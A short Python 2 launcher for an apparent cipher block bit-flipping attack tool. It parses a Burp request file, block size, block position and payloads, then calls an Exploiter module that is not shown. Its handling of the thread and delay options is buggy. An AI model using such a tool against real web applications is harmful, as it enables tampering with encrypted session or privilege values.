import sys
import HTTPRequester
import Exploiter

requests_location = None
block_size = None
position = None
payloads_list = None
block_position = None
delay = None

def usage():
    help = "1) Request with the burp suite format (XML), string should be between @@@ character. -f (file) \n" \
           "2) size of the blocks. -bs (size, X-if dont know size) (can be 8 or 16) \n" \
           "3) which block should be exploited. -bp (position, X-if you dont know which) \n" \
           "4) the payload and position ): -pay 2-true;,false/6-false,true;/11-2,3 or X-1,0 or X-0,1 or \n" \
           "X-parameteryouknow, parameteryouwannause (for testing every position in the block)"
    return help

def get_params():
    global requests_location, block_size, position, payloads_list
    params = [requests_location, block_size, position, payloads_list]
    return params

def setOptions(arguments1):
    global requests_location, block_size, block_position, payloads_list, max_threads, delay
    arguments = ' '.join(arguments1)
    requests_location = arguments.split("-f", 1)[1].split(" ")[1]
    block_size = arguments.split("-bs", 1)[1].split(" ")[1]
    block_position = arguments.split("-bp", 1)[1].split(" ")[1]
    payloads_list = arguments.split("-pay", 1)[1].split(" ")[1]
    max_threads = arguments.split("-th", 1)[1].split(" ")[1]
    if '-th' not in arguments or max_threads == '':
        max_threads = 30
    delay = arguments.split("-dl", 1)[1].split(" ")[1]
    if '-dl' not in arguments:
        delay = 0

def main():
    global requests_location, block_size, block_position, payloads_list, max_threads

    try:
        setOptions(sys.argv[1:])
    except Exception as msg:
        print usage()
        sys.exit()

    HTTPRequester.set_file(requests_location)
    Exploiter.set_key()
    Exploiter.set_params(block_size, block_position, payloads_list, max_threads, delay)
    Exploiter.exploit()

main()